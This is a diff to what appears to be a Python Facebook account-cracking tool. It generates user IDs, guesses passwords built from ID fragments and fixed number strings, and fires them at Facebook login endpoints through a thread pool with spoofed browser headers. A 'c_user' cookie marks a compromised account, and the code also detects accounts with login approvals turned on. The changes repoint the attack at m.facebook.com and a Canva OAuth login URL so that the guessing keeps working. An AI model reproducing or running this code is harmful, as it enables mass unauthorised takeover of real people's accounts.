@@ -1174,7 +1174,7 @@ def SUMON2():
         for guru in user:
             uid = kode+guru
             mk = uid[:6]
-            pwx = [uid[:6], uid,mk,"57273200", "59039200", "57575753"]
+            pwx = [uid[:6], uid,mk,uid[:8], "59039200", "57273200"]
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
@@ -1821,12 +1821,12 @@ def mbasic(uid,pwx,tl):
             'a': 'AYkh5-Ex-aRI47lU6Jgp6nOr4nUFJTvg0RTBgdXo6WoapXVQh6_VcCAiJjMlLOcz71dLoR5aOxzCjylrJvKDQrdmi0ungLJpGVEzgx27yKwTyA',
             'user': '0'}
             headers ={
-            'authority': 'mbasic.facebook.com',
+            'authority': 'm.facebook.com',
             'accept': '*/*',
             'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
             'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/login.php',
+            'origin': 'https://m.facebook.com',
+            'referer': 'https://m.facebook.com/login.php',
             'sec-ch-prefers-color-scheme': 'light',
             'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
             'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
@@ -1843,7 +1843,7 @@ def mbasic(uid,pwx,tl):
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://mbasic.facebook.com/login/device-based/login/async/"
+            url = "https://m.facebook.com/login.php?skip_api_login=1&api_key=525265914179580&kid_directed_site=0&app_id=525265914179580&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3D8f53c0e0-eb2e-4f3d-9e48-3e33c05d1e16%26scope%3Demail%252Copenid%252Cpublic_profile%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7ba56c7b-2200-4214-a249-e14616d81be3%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.canva.com%2Foauth%2Fauthorized%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D8f53c0e0-eb2e-4f3d-9e48-3e33c05d1e16%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
